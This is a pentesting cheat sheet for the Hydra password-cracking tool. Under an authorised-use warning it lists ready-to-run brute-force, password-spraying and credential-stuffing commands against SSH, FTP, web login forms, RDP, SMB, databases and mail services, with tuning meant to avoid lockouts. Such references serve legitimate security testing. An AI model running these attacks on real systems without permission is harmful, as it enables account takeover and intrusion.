---
title: "Hydra"
description: "Hydra commands for brute forcing SSH, FTP, HTTP, RDP, SMB, MySQL, and other protocols with wordlists, credential stuffing, and tuning options."
icon: "🐉"
weight: 19
count: 45
tags: ["hydra", "brute-force", "pentesting", "security"]
---

{{< callout type="warning" >}}
Hydra is for **authorised penetration testing, CTF competitions, and security research only**. Use only on systems you have explicit written permission to test.
{{< /callout >}}

## Basic Syntax

```bash
hydra -l <user> -p <pass> <target> <service>          # single user + pass
hydra -l <user> -P <passlist> <target> <service>       # single user + wordlist
hydra -L <userlist> -p <pass> <target> <service>       # user list + single pass
hydra -L <userlist> -P <passlist> <target> <service>   # both lists
hydra -C <combo-file> <target> <service>               # colon-separated user:pass file
```

## SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -l root -P rockyou.txt target.com ssh
hydra -l root -P rockyou.txt target.com -s 2222 ssh       # custom port
hydra -L users.txt -P rockyou.txt ssh://target.com
hydra -L users.txt -P rockyou.txt ssh://target.com -t 4   # 4 threads (SSH is sensitive)
hydra -l admin -P rockyou.txt ssh://target.com -o ssh_results.txt
```

## FTP

```bash
hydra -l admin -P rockyou.txt ftp://target.com
hydra -L users.txt -P rockyou.txt ftp://target.com
hydra -l anonymous -p anonymous ftp://target.com
hydra -l admin -P rockyou.txt target.com -s 2121 ftp      # custom port
```

## HTTP — GET Form

```bash
hydra -l admin -P rockyou.txt target.com http-get /protected/
hydra -l admin -P rockyou.txt target.com http-get-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

## HTTP — POST Form

```bash
# Syntax: http-post-form "path:body:failure_string"
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# With session cookie
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"

# Custom failure message match
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed"

# Success string match (S= instead of F=)
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome"

# HTTPS POST form
hydra -l admin -P rockyou.txt -s 443 target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Incorrect"
```

## HTTP Basic Auth

```bash
hydra -l admin -P rockyou.txt target.com http-get /admin/
hydra -L users.txt -P rockyou.txt https://target.com http-get /admin/
```

## RDP

```bash
hydra -l administrator -P rockyou.txt rdp://target.com
hydra -L users.txt -P rockyou.txt rdp://target.com
hydra -l administrator -P rockyou.txt target.com rdp -t 4
```

## SMB

```bash
hydra -l administrator -P rockyou.txt smb://target.com
hydra -L users.txt -P rockyou.txt smb://target.com
hydra -l admin -P rockyou.txt target.com smb
```

## FTP / Telnet / VNC

```bash
# Telnet
hydra -l root -P rockyou.txt telnet://target.com

# VNC (password only, no username)
hydra -P rockyou.txt vnc://target.com

# SNMP
hydra -P community_strings.txt snmp://target.com
```

## Databases

```bash
# MySQL
hydra -l root -P rockyou.txt mysql://target.com
hydra -L users.txt -P rockyou.txt mysql://target.com

# PostgreSQL
hydra -l postgres -P rockyou.txt postgres://target.com

# MSSQL
hydra -l sa -P rockyou.txt mssql://target.com

# MongoDB
hydra -l admin -P rockyou.txt mongodb://target.com
```

## SMTP / Email

```bash
# SMTP
hydra -l user@target.com -P rockyou.txt smtp://mail.target.com

# SMTP with STARTTLS
hydra -l user@target.com -P rockyou.txt smtp://mail.target.com:587

# IMAP
hydra -l user@target.com -P rockyou.txt imap://mail.target.com

# POP3
hydra -l user@target.com -P rockyou.txt pop3://mail.target.com
```

## Options & Tuning

```bash
# Threads (default 16, lower for SSH/RDP)
hydra -l admin -P rockyou.txt target.com ssh -t 4

# Wait between attempts (seconds)
hydra -l admin -P rockyou.txt target.com ssh -W 3

# Exit after first valid pair found
hydra -l admin -P rockyou.txt target.com ssh -f     # stop after first per host
hydra -l admin -P rockyou.txt target.com ssh -F     # stop after first globally

# Restore interrupted session
hydra -R

# Output results to file
hydra -l admin -P rockyou.txt target.com ssh -o results.txt

# Verbose mode
hydra -l admin -P rockyou.txt target.com ssh -v     # show attempts
hydra -l admin -P rockyou.txt target.com ssh -V     # show every login+pass pair
hydra -l admin -P rockyou.txt target.com ssh -d     # debug

# Proxy
hydra -l admin -P rockyou.txt target.com ssh -u -e nsr -o out.txt
hydra -l admin -P rockyou.txt -s 80 -S target.com http-post-form \
  "/login:u=^USER^&p=^PASS^:F=fail"

# Custom port
hydra -l admin -P rockyou.txt -s 2222 target.com ssh

# Try null password, same-as-user, and reversed username
hydra -l admin -P rockyou.txt target.com ssh -e nsr
# n = null password, s = same as username, r = reversed username

# Loop around users (spray each password against all users before next password)
hydra -L users.txt -P rockyou.txt target.com ssh -u
```

## Credential Stuffing

```bash
# Colon-separated user:pass combo file
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt \
  ssh://target.com

hydra -C combos.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"
```

## Useful Combinations

```bash
# SSH spray — common passwords against user list, stop on first hit
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://target.com -t 4 -f -o ssh_hits.txt

# Web login brute force — verbose, save results
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=Incorrect" \
  -V -o web_hits.txt -t 20

# RDP with low thread count to avoid lockout
hydra -L users.txt -P passwords.txt rdp://target.com -t 2 -W 5 -f

# SMTP user enumeration via login attempts
hydra -L users.txt -p invalidpassword smtp://mail.target.com -V
```
